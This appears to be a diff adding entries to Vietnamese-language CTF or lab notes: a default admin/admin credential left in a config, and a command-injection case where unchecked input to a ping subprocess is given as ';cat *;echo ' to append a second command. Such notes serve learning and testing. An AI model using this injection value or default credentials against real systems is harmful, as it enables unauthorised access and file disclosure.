@@ -61,3 +61,19 @@ for(i=0; i<=10000; i++){
  $('#jack-target').trigger("click")
 }
 ```
+## web-misconf-1
+- config quên xóa default password
+```
+user: admin
+pass: admin
+```
+## command-injection-1
+- Server chạy subprocess nhưng không kiểm tra đầu vào của input:
+```
+ping -c 3 "{input}"
+-> input = ";cat *;echo "
+-> ping -c 3 ""; cat *; echo ""
+```
+
+## 
+
